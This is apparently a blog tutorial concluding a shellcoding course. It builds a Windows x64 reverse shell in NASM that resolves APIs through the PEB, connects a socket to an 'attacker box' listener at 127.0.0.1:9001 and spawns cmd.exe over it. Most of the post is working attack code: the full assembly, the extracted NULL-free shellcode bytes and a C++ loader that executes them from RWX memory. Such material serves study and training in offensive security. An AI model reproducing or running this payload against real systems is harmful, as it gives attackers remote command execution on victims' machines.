---
title:  "x64 Assembly & Shellcoding 101 - Conclusion"
header:
  teaser: "/assets/images/conclusion.png"
categories:
  - Shellcoding
  - Assembly
  - Debugging
tags:
  - Shellcoding
  - x64
  - x64dbg
  - '2024'
  - nasm
  - assembly
  - debugging
---

Well it's been a fun ride, but we've reached our destination. 🚗 Time to wrap things up with our Assembly and Shellcoding 101 course and move on to the next exciting topic on this blog.  Don't know what that's going to be just yet, but I have some ideas 😸 

Today, we will focus on coding a reverse shell in pure x64 assembly, complimented by NULL free shellcode to close out this series.  This is sort of like a final exam to see what all you've learned up until this point 😃, and honestly I wouldn't dock you points if today's content seems a bit overwhelming.  An x64 assembly based reverse shell requires a lot of apis and an all around solid understanding of x64 assembly concepts.  Today's code is long, but I tailored it in such a way that you can follow along without getting a headache along the way.  

Let's begin!

***The Familiar x64 Assembly Prologue***
-

```nasm
BITS 64
SECTION .text
global main
main:
sub rsp, 0x28                       ; stack alignment
and rsp, 0xFFFFFFFFFFFFFFF0         ; stack alignment
xor rcx, rcx                        ; RCX = 0
mov rax, [gs:rcx + 0x60]            ; RAX = PEB
mov rax, [rax + 0x18]               ; RAX = PEB->Ldr
mov rsi,[rax+0x10]                  ; PEB.Ldr->InLoadOrderModuleList
mov rsi, [rsi]
mov rsi,[rsi]
mov rbx, [rsi+0x30]                 ; kernel32.dll base address
mov r8, rbx                         ; mov kernel32.dll base addr into r8
mov ebx, [rbx+0x3C]                 ; Get Kernel32 PE Signature (offset 0x3C) into EBX
add rbx, r8                         ; Add signature offset to kernel32 base. Store in RBX.
xor rcx, rcx                        ; Avoid null bytes from mov edx,[rbx+0x88] by using rcx register to add
add cx, 0x88ff                      ; cx is the lower 16 bit portion of ecx (32 bit), and rcx is 64 bit.
shr rcx, 0x8                        ; RCX = 0x88ff --> 0x88
mov edx, [rbx+rcx]                  ; EDX = [&NewEXEHeader + Offset RVA ExportTable] = RVA ExportTable
add rdx, r8                         ; RDX = kernel32.dll + RVA ExportTable = ExportTable Address
mov r10d, [rdx+0x14]                ; Number of functions
xor r11, r11                        ; Zero R11 before use
mov r11d, [rdx+0x20]                ; AddressOfNames RVA
add r11, r8                         ; AddressOfNames VMA
mov rcx, r10                        ; store number of functions for future use
mov rax, 0x9090737365726464         ; 'ddress'
shl rax, 0x10                       ; 7373657264640000
shr rax, 0x10                       ; 0000737365726464 terminate our string w/ no nulls present in our shellcode!
push rax
mov rax, 0x41636F7250746547         ; 'GetProcA '
push rax
mov rax, rsp
```

I'd say at least this portion of our code today should look familiar to you 😺  It doesn't change too much since we'll always be walking the PE export table to find our functions.  The only extra line of code I added is the **GetProcAddress** string being pushed to the stack for referencing in our function name lookup loop in the next section of code.

***Function Name Lookup***
-

```nasm
findfunction:                       ; Loop over Export Address Table to find WinApi names
    jecxz FunctionNameNotFound      ; Loop around this function until we find WinExec
    xor ebx,ebx                     ; Zero EBX for use
    mov ebx, [r11+rcx*4]            ; EBX = RVA for first AddressOfName
    add rbx, r8                     ; RBX = Function name VMA / add kernel32 base address to RVA and get WinApi name
    dec rcx                         ; Decrement our loop by one, this goes from Z to A
    ; Load first 8 bytes of "GetProcA"
    mov r9, qword [rax]             ; R9 = "GetProcA"
    cmp [rbx], r9                   ; Compare first 8 bytes
    jnz findfunction                ; If not equal, continue loop
    ; Check next part for "ddress" (4 bytes)
    mov r9d, dword [rax + 8]        ; R9 = "ddress"
    cmp [rbx + 8], r9d              ; Compare remaining part
    jz FunctionNameFound            ; If match, function found
	jnz findfunction
FunctionNameNotFound:
    int3
FunctionNameFound:
    push rcx
    pop r15                         ; GetProcAddress position in Function Names
    inc r15   
    xor r11, r11
    mov r11d, [rdx+0x1c]            ; AddressOfFunctions RVA
    add r11, r8                     ; AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
    mov eax, [r11+r15*4]            ; Get the function RVA.
    add rax, r8                     ; Found the GetProcAddress WinApi!!!
    push rax                        ; push GetProcAddress temporarily to be used by next segment
```

I really should have explained this section better in the earlier posts in this series.  Well, better late than never 😆  What we're doing here is taking `RCX`, which is the total function count, and decrementing that value until we find our function in question: **GetProcAddress**

We're also cheating a little bit here.  We're looking for the first 8 bytes  of the API name.  Actually, if it's easier to follow it's literally the first 8 characters of the string in question.  So, in this case, **GetProcA**.  Once we find that value, we lookup the the next 4 characters / bytes, which uses a `DWORD` type.  That would be **ddre**.  So in total, we're looking for this string: **GetProcAddre** and assuming if our comparison of strings succeeds, then we located **GetProcAddress**.  I'm using this because if I did a **QWORD** compare twice, the second comparison would include data not part of our string.  **Why?**  Because `ddress`, the second part of our API string (**GetProcA**), is 6 characters or 6 bytes.  The stack is 8 bytes, and the remaining 2 bytes would contain garbage.  

This works for most functions, however, there are some it doesn't work perfectly for, such as **CreateProcess**.  CreateProcess can be **CreateProcessA** or **CreateProcessW**.  One is for ascii encoding and the other wide character encoding.  That's neither here nor there, just wanted you to know this function name lookup isn't perfect.  It's a quick and dirty way to lookup a function without having to resort to using a lot of code. We can afford to trim our code as much as possible, trust me 😸

Once we find **GetProcAddress**, we store it in `RAX`.  Moving on!

***Locate LoadLibraryA address***
-

```nasm
; Prepare arguments for getting q handle to LoadLibraryA:
    pop r15                         ; temporary use
    mov r12, r15                    ; save copy of GetProcAddress for future use
    mov rdi, r8                     ; make a copy of kernel32 base address for future use
    mov rcx, r8                     ; RCX = handle to kernel32.dll (first argument)
; Load "LoadLibraryA" onto the stack
    mov rax, 0x41797261             ; aryA, 0 (include null byte)
    push rax
    mov rax, 0x7262694C64616F4C     ; LoadLibr 
    push rax
    mov rdx, rsp                    ; RDX points to "LoadLibraryA" (second argument)
    sub rsp, 0x30                   ; decimal 48 ( 3 x 16 bytes)
    call r15                        ; Call GetProcAddress
    add rsp, 0x30
    mov r15, rax                    ; holds LoadLibraryA!

;Okay, let's make some notes on our current register values
;==========================================================
;r15 = LoadLibraryA
;rdi = Kernel32
;r12 = GetProcAddress
```

This part is pretty straight forward.  We're passing in **kernel32** as the 1st parameter and **LoadLibraryA** as the 2nd parameter to **GetProcAddress**.

**We're literally just filling out the API per Microsoft's documentation:**

```c++
FARPROC GetProcAddress(
  [in] HMODULE hModule,
  [in] LPCSTR  lpProcName
);
```

***Locate ExitProcess address***
-

```nasm
;exitprocess
    mov r9, r12                      ; r9 temporarily holds GetProcAddress handle
    mov rcx, rdi                     ; RCX = handle to kernel32.dll (first argument)
    ; Load "ExitProcess" onto the stack
    mov rax, 0x90737365              ; 'ess'
    shl eax, 0x8                     ; 0000000073736500
    shr eax, 0x8                     ; 0000000000737365 terminate our string w/ no nulls present in our shellcode!
    push rax
    mov rax, 0x636F725074697845      ; ExitProc 
    push rax
    mov rdx, rsp                     ; RDX points to "ExitProcess" (second argument)
    sub rsp, 0x30
    call r9                          ; Call GetProcAddress
    add rsp, 0x30
    mov rbx, rax                     ; RBX holds ExitProcess!
```

Starting to see a pattern? 😄  Same as the last API lookup except this time we're looking for **ExitProcess**.

***Locate CreateProcessA address***
-

```nasm
;CreateProcessA
    mov r9, r12                      ; r9 temporarily holds GetProcAddress handle
    mov rcx, rdi                     ; RCX = handle to kernel32.dll (first argument)
    ; Load "CreateProcessA" onto the stack
    mov rax, 0x909041737365636F              ; 'ocessA'
    shl rax, 0x10                     ; 0000000073736500
    shr rax, 0x10                     ; 0000000000737365 terminate our string w/ no nulls present in our shellcode!
    push rax
    mov rax, 0x7250657461657243      ; CreatePr 
    push rax
    mov rdx, rsp                     ; RDX points to "CreateProcessA" (second argument)
    sub rsp, 0x30
    call r9                          ; Call GetProcAddress
    add rsp, 0x30
    mov r13, rax                     ; r13 holds CreateProcessA!
```

Same thing, lol.  I wrote the code this way to make this as easy to understand as I could.  So far not too bad right?  Let's keep going

***Locate Ws2_32 address***
-

```nasm
;ws2_32.dll
    mov rax, 0x90906C6C              ; add "ll" string to RAX
    shl eax, 0x10                    ; 000000006C6C0000
    shr eax, 0x10                    ; 0000000000006C6C
    push rax                         ; push RAX to stack
    mov rax, 0x642E32335F327377      ; Add "ws2_32.d" string to RAX.
    push rax                         ; Push RAX to stack
    mov rcx, rsp                     ; Move a pointer to ws2_32.dll into RCX.
    sub rsp, 0x30
    call r15                         ; Call LoadLibraryA("ws2_32.dll")
    mov r14, rax                     ; holds ws2_32.dll address!!!
```

The registers are starting to fill up!  Soooooo many APIs to locate.  Now we're starting to locate socket APIs.  We're about 40% there.  Let's keep at it!

***Locate WSAStartup address***
-

```nasm
; Prepare arguments for GetProcAddress to load WSAStartup using ws2_32:
    mov rcx, r14                     ; RCX = handle to ws2_32.dll (first argument)
    mov rax, 0x90907075              ; Load "up" into RAX
    shl eax, 0x10                     ; 0000000041786F00
    shr eax, 0x10                     ; 000000000041786F
    push rax
    mov rax, 0x7472617453415357      ; Load "WSAStart" into RAX                  
    push rax
    mov rdx, rsp                     ; RDX points to "WSAStartup" (second argument)
    sub rsp, 0x30
    call r12                         ; Call GetProcAddress
    mov r15, rax                     ; Got WSAStartup!  Let's store it
```

We got `WSAStartup`, now we need to get a few more and then we can finally start using some of these newly acquired APIs 😸

***Locate WSASocketA address***
-

```nasm
; Prepare arguments for GetProcAddress to load WSASocketA using ws2_32:
    mov rcx, r14                     ; RCX = handle to ws2_32.dll (first argument)
    mov rax, 0x90904174              ; Load "tA" into RAX
    shl eax, 0x10                     ; 0000000041786F00
    shr eax, 0x10                     ; 000000000041786F
    push rax
    mov rax, 0x656B636F53415357      ; Load "WSASocke" into RAX                  
    push rax
    mov rdx, rsp                     ; RDX points to "WSASocketA" (second argument)
    sub rsp, 0x30
    call r12                         ; Call GetProcAddress
    mov rsi, rax                     ; Got WSASocketA!  Let's store it
```
One more left.  Again, not bad right?  This is all just rinse and repeat API lookups.  There are cleaner ways of doing this, using function loops and so on.  But this is in my opinion the easiest format for teaching and understanding API lookups using x64 assembly.

***Locate WSAConnect address***
-

```nasm
; Prepare arguments for GetProcAddress to load WSAConnect using ws2_32:
    mov rcx, r14                     ; RCX = handle to ws2_32.dll (first argument)
    mov rax, 0x90907463              ; Load "ct" into RAX
    shl eax, 0x10                    ; 0000000041786F00
    shr eax, 0x10                    ; 000000000041786F
    push rax
    mov rax, 0x656E6E6F43415357      ; Load "WSAConne" into RAX                  
    push rax
    mov rdx, rsp                     ; RDX points to "WSAConnect" (second argument)
    sub rsp, 0x30
    call r12                         ; Call GetProcAddress
    mov rdi, rax                     ; Got WSAConnect!  Let's store it
	
    mov r14, r13                     ; move CreateProcessA out of r13 into r14 for later use
	
;Update #2 - register values
;===========================
;rbx = ExitProcess
;r12 = GetProcAddress
;r14 = CreateProcessA
;r14 = ws2_32
;r15 = WSAStartup
;rsi = WSASocketA
;rdi = WSAConnect
```

***Initiate WSAStartup***
-

```nasm
; Call WSAStartup
    xor rcx, rcx
    mov cx, 0x198               ; Defines the size of the buffer that will be allocated on the stack to hold the WSADATA structure
    sub rsp, rcx                ; Reserve space for lpWSDATA structure
    lea rdx, [rsp]              ; Assign address of lpWSAData to RDX - 2nd param
    mov cx, 0x202               ; Assign 0x202 to wVersionRequired as 1st parameter
    sub rsp, 0x28               ; stack alignment
    call r15                    ; Call WSAStartup
    add rsp, 0x30               ; stack alignment
```

Awesome, we're starting to setup our socket!  Now the fun begins...

Also, here's the API we're loading:

```c++
int WSAStartup(
  [in]  WORD      wVersionRequired,
  [out] LPWSADATA lpWSAData
);
```

***Create a Socket!!!***
-

```nasm
 ; Create a socket 
    xor rcx, rcx           
    mov cl, 2                   ; AF = 2 - 1st param
    xor rdx, rdx          
    mov dl, 1                   ; Type = 1 - 2nd param
    xor r8, r8              
    mov r8b, 6                  ; Protocol = 6 - 3rd param
    xor r9, r9                  ; lpProtocolInfo = 0 - fourth param
    mov [rsp+0x20], r9          ; 0 = 5th param
    mov [rsp+0x28], r9          ; 0 = 6th param
    call rsi                    ; Call WSASocketA 
    mov r12, rax                ; Save the returned socket value
    add rsp, 0x30           
```

**Here's the API:**

```c++
SOCKET WSAAPI WSASocketA(
  [in] int                 af,
  [in] int                 type,
  [in] int                 protocol,
  [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,
  [in] GROUP               g,
  [in] DWORD               dwFlags
);
```

I'd like to point out that this is the first instance in our Assembly and Shellcode series that we have more than 4 parameters being passed into our function call.  

Here's how things are laid out here:

- 1st parameter (**RCX**) = 2.  By the way, **CL** is the lower 8 bit portion of the **RCX** register.  It goes: `RCX`, `ECX`, `CX`, and `CL`.
- 2nd parameter (**RDX**) = 1
- 3rd parameter (**r8**) = 6.  `r8b` is the lower 8 bit value in the `r8` register.
- 4th parameter (**r9**) - 0.
  
The **5th** parameter and **6th** parameters are not passed into registers but rather directly onto the stack, as follows:

- 0x0 = 0 = RCX
- 0x8 = 8 = RDX
- 0x10 = 16 = R8
- 0x18 = 24 = R9
- 0x20 = 32 = [rsp+0x20] our 5th parameter where we simply pass the value 0 into [rsp+0x20]
- 0x28 = 40 = [rsp+0x28] our 6th parameter where we simply pass the value 0 into [rsp+0x28]

***Connect our socket to our attacker box listener!!!***
-

```nasm
; Initiate Socket Connection
    mov r13, rax                ; Store SOCKET handle in r13 for future needs
    mov rcx, r13                ; Our socket handle as parameter 1
    xor rax,rax                 ; rax = 0
    inc rax                     ; rax = 1
    inc rax                     ; rax = 2
    mov [rsp], rax              ; AF_INET = 2
    mov ax, 0x2923              ; Port 9001
    mov [rsp+2], ax             ; our Port
    ;mov rax, 0x0100007F        ; IP 127.0.0.1 (I use virtual box with port forwarding, hence the localhost addr)
    mov rax, 0xFFFFFFFFFEFFFF80 ; 127.0.0.1 encoded with NOT to avoid NULLs
    not rax                     ; decoded value
    mov [rsp+4], rax            ; our IP
    lea rdx,[rsp]               ; Save pointer to RDX
    mov r8b, 0x16               ; Move 0x10 (decimal 16) to namelen
    xor r9,r9             
    push r9                     ; NULL
    push r9                     ; NULL 
    push r9                     ; NULL
    add rsp, 8
    sub rsp, 0x60               ; This is somewhat problematic. needs to be a high value to account for the values pushed to the stack
    sub rsp, 0x60               ; in short, making space on the stack for stuff to get populated after executing WSAConnect
    call rdi                    ; Call WSAConnect
```

**Here's the API documentation:**

```c++
int WSAAPI WSAConnect(
  [in]  SOCKET         s,
  [in]  const sockaddr *name,
  [in]  int            namelen,
  [in]  LPWSABUF       lpCallerData,
  [out] LPWSABUF       lpCalleeData,
  [in]  LPQOS          lpSQOS,
  [in]  LPQOS          lpGQOS
);
```

Here, we're adding the IP and port of our listener on our attacker box.  We're also doing some fancy stuff with our code to avoid NULLs such as NOT'ing our strings/values, etc.  Once this API is called, you should see a connection on your netcat or listening agent on your attacker box! 😸

***STARTUPINFOA, CreateProcessA and our command shell (cmd.exe)!!! + ExitProcess***
-

```nasm
;prepare for CreateProcessA
    add rsp, 0x30
    mov rax, 0xFF9A879AD19B929C  ; encode cmd.exe using NOT to remove NULL bytes
    not rax                      ; decode cmd.exe
    push rax                      
    mov rcx, rsp                ; RCX = lpApplicationName (cmd.exe)
    ; STARTUPINFOA Structure (I despise this thing)
	; https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
    push r13                    ; Push STDERROR
    push r13                    ; Push STDOUTPUT
    push r13                    ; Push STDINPUT
    xor rax,rax
    push rax                    ; 8 bytes -> push lpReserved2
    push rax                    ; 8 bytes -> combine cbReserved2 and wShowWindow
    push ax                     ; dwFlags 4 bytes total, first 2 bytes
    mov al, 0x1                 ; STARTF_USESTDHANDLES
    shl eax, 0x8                ; = 0x100 and removes NULL bytes!
    push ax                     ; continuation of the above, last 2 bytes for dwFlags
    xor rax,rax  
    push rax                    ; dwFillAttribute (4 bytes) + dwYCountChars (4 bytes)
    push rax                    ; dwXCountChars (4 bytes) + dwYSize (4 bytes)
    push rax                    ; dwXSize (4 bytes) + dwY (4 bytes)
    push ax                     ; dwX 4 bytes total, first 2 bytes
    push ax                     ; dwX last 2 bytes
    push rax                    ; 8 bytes -> lpTitle
    push rax                    ; 8 bytes -> lpDesktop = NULL
    push rax                    ; 8 bytes -> lpReserved = NULL
    mov al, 0x68                ; total size of structure.  Move it into AL to avoid NULLs
    push rax                    
    mov rdi,rsp                 ; Copy the pointer to the structure to RDI
    ; Call CreateProcessA
    mov rax, rsp                ; Get current stack pointer
    sub ax, 0x4FF               ; Setup space on the stack for holding process info
    dec ax                      ; we're subtracting 0x500 in total but we do it this way to avoid nulls
    push rax                    ; ProcessInfo
    push rdi                    ; StartupInfo -> Pointer to STARTUPINFOA
    xor rax, rax
    push rax                    ; lpCurrentDirectory
    push rax                    ; lpEnvironment
    push rax                   
    inc rax
    push rax                    ; bInheritHandles -> 1
    xor rax, rax
    push rax                    ; hStdInput = NULL
    push rax                    ; hStdOutput = NULL
    push rax                    ; hStdError = NULL
    push rax                    ; dwCreationFlags
    mov r8, rax                 ; lpThreadAttributes            
    mov r9, rax                 ; lpProcessAttributes           
    mov rdx, rcx                ; lpCommandLine = "cmd.exe" 
    mov rcx, rax                ; lpApplicationName              
    call r14                    ; Call CreateProcessA
    ; Clean exit
    xor rcx, rcx                ; move 0 into RCX = 1st parameter
    call rbx                    ; Call ExitProcess
```

First off, yea...it's daunting right?  Man this part took me forever to wrap my head around it.  Let's start with the api:

```c++
BOOL CreateProcessA(
  [in, optional]      LPCSTR                lpApplicationName,
  [in, out, optional] LPSTR                 lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCSTR                lpCurrentDirectory,
  [in]                LPSTARTUPINFOA        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);
```

I covered the **STARTUPINFOA** in the last post, so I'm not going to go into great detail on that today.  As for **CreateProcessA**, I've tried to add comments throughout so you can see how we're pushing values to the required parameters and moving them onto the stack.  I can't go into greater detail at the moment as I need to wrap this up, but If you have questions don't hesitate to reach out.

Okay, let's compile this monster, grab our shellcode, and get ourselves a reverse shell shall we? 😄

**nasm -fwin64 asmsock2.asm**

**for i in $(objdump -D asmsock2.obj \| grep "^ " \| cut -f2); do echo -n "\x$i" ; done**

**Include the generated shellcode in our c++ program.  And yes I realize it's large.  Remember, this was for learning purposes 😄**

**I'll trim the shellcode someday using more function lookup loops if I decide to do an advanced x64 assembly course.  I don't have the bandwidth for that atm lol!**

```c++
#include <windows.h>
#include <iostream>

// Shellcode (as given, formatted for clarity)
unsigned char shellcode[] =
"\x48\x83\xec\x28\x48\x83\xe4\xf0\x48\x31\xc9\x65\x48\x8b\x41\x60\x48\x8b\x40\x18\x48\x8b\x70\x10\x48\x8b"
"\x36\x48\x8b\x36\x48\x8b\x5e\x30\x49\x89\xd8\x8b\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48"
"\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x44\x8b\x52\x14\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4c\x89\xd1"
"\x48\xb8\x64\x64\x72\x65\x73\x73\x90\x90\x48\xc1\xe0\x10\x48\xc1\xe8\x10\x50\x48\xb8\x47\x65\x74\x50\x72"
"\x6f\x63\x41\x50\x48\x89\xe0\x67\xe3\x20\x31\xdb\x41\x8b\x1c\x8b\x4c\x01\xc3\x48\xff\xc9\x4c\x8b\x08\x4c"
"\x39\x0b\x75\xe9\x44\x8b\x48\x08\x44\x39\x4b\x08\x74\x03\x75\xdd\xcc\x51\x41\x5f\x49\xff\xc7\x4d\x31\xdb"
"\x44\x8b\x5a\x1c\x4d\x01\xc3\x43\x8b\x04\xbb\x4c\x01\xc0\x50\x41\x5f\x4d\x89\xfc\x4c\x89\xc7\x4c\x89\xc1"
"\xb8\x61\x72\x79\x41\x50\x48\xb8\x4c\x6f\x61\x64\x4c\x69\x62\x72\x50\x48\x89\xe2\x48\x83\xec\x30\x41\xff"
"\xd7\x48\x83\xc4\x30\x49\x89\xc7\x4d\x89\xe1\x48\x89\xf9\xb8\x65\x73\x73\x90\xc1\xe0\x08\xc1\xe8\x08\x50"
"\x48\xb8\x45\x78\x69\x74\x50\x72\x6f\x63\x50\x48\x89\xe2\x48\x83\xec\x30\x41\xff\xd1\x48\x83\xc4\x30\x48"
"\x89\xc3\x4d\x89\xe1\x48\x89\xf9\x48\xb8\x6f\x63\x65\x73\x73\x41\x90\x90\x48\xc1\xe0\x10\x48\xc1\xe8\x10"
"\x50\x48\xb8\x43\x72\x65\x61\x74\x65\x50\x72\x50\x48\x89\xe2\x48\x83\xec\x30\x41\xff\xd1\x48\x83\xc4\x30"
"\x49\x89\xc5\xb8\x6c\x6c\x90\x90\xc1\xe0\x10\xc1\xe8\x10\x50\x48\xb8\x77\x73\x32\x5f\x33\x32\x2e\x64\x50"
"\x48\x89\xe1\x48\x83\xec\x30\x41\xff\xd7\x49\x89\xc6\x4c\x89\xf1\xb8\x75\x70\x90\x90\xc1\xe0\x10\xc1\xe8"
"\x10\x50\x48\xb8\x57\x53\x41\x53\x74\x61\x72\x74\x50\x48\x89\xe2\x48\x83\xec\x30\x41\xff\xd4\x49\x89\xc7"
"\x4c\x89\xf1\xb8\x74\x41\x90\x90\xc1\xe0\x10\xc1\xe8\x10\x50\x48\xb8\x57\x53\x41\x53\x6f\x63\x6b\x65\x50"
"\x48\x89\xe2\x48\x83\xec\x30\x41\xff\xd4\x48\x89\xc6\x4c\x89\xf1\xb8\x63\x74\x90\x90\xc1\xe0\x10\xc1\xe8"
"\x10\x50\x48\xb8\x57\x53\x41\x43\x6f\x6e\x6e\x65\x50\x48\x89\xe2\x48\x83\xec\x30\x41\xff\xd4\x48\x89\xc7"
"\x4d\x89\xee\x48\x31\xc9\x66\xb9\x98\x01\x48\x29\xcc\x48\x8d\x14\x24\x66\xb9\x02\x02\x48\x83\xec\x28\x41"
"\xff\xd7\x48\x83\xc4\x30\x48\x31\xc9\xb1\x02\x48\x31\xd2\xb2\x01\x4d\x31\xc0\x41\xb0\x06\x4d\x31\xc9\x4c"
"\x89\x4c\x24\x20\x4c\x89\x4c\x24\x28\xff\xd6\x49\x89\xc4\x48\x83\xc4\x30\x49\x89\xc5\x4c\x89\xe9\x48\x31"
"\xc0\x48\xff\xc0\x48\xff\xc0\x48\x89\x04\x24\x66\xb8\x23\x29\x66\x89\x44\x24\x02\x48\xc7\xc0\x80\xff\xff"
"\xfe\x48\xf7\xd0\x48\x89\x44\x24\x04\x48\x8d\x14\x24\x41\xb0\x16\x4d\x31\xc9\x41\x51\x41\x51\x41\x51\x48"
"\x83\xc4\x08\x48\x83\xec\x60\x48\x83\xec\x60\xff\xd7\x48\x83\xc4\x30\x48\xb8\x9c\x92\x9b\xd1\x9a\x87\x9a"
"\xff\x48\xf7\xd0\x50\x48\x89\xe1\x41\x55\x41\x55\x41\x55\x48\x31\xc0\x50\x50\x66\x50\xb0\x01\xc1\xe0\x08"
"\x66\x50\x48\x31\xc0\x50\x50\x50\x66\x50\x66\x50\x50\x50\x50\xb0\x68\x50\x48\x89\xe7\x48\x89\xe0\x66\x2d"
"\xff\x04\x66\xff\xc8\x50\x57\x48\x31\xc0\x50\x50\x50\x48\xff\xc0\x50\x48\x31\xc0\x50\x50\x50\x50\x49\x89"
"\xc0\x49\x89\xc1\x48\x89\xca\x48\x89\xc1\x41\xff\xd6\x48\x31\xc9\xff\xd3";

int main() {
    // Allocate executable memory
    void* exec_mem = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (exec_mem == nullptr) {
        std::cerr << "Memory allocation failed\n";
        return -1;
    }

    // Copy shellcode to the allocated memory
    memcpy(exec_mem, shellcode, sizeof(shellcode));

    // Create a function pointer to the shellcode
    auto shellcode_func = reinterpret_cast<void(*)()>(exec_mem);

    // Execute the shellcode
    shellcode_func();

    // Free the allocated memory
    VirtualFree(exec_mem, 0, MEM_RELEASE);

    return 0;
}
```

**run it!**

![image](https://github.com/user-attachments/assets/b9bb2997-23b2-4bad-a0a2-ac8b6da0d8d0)

That's it everyone!  If you've made it this far and read the other posts in this series, kudos to you on a job well done!  If you'd like to learn more than what I've covered in this series, I'd be interested to hear from you.  I am considering a paid tier service offering at some point to go into things in greater detail, include videos, etc.  If that's something that appeals to you, let me know.  The more interest I receive the more I'll be interested in setting aside the time to put that package offering together.  

See you next time, and thanks for checking out my Assembly and Shellcoding 101 series!!!

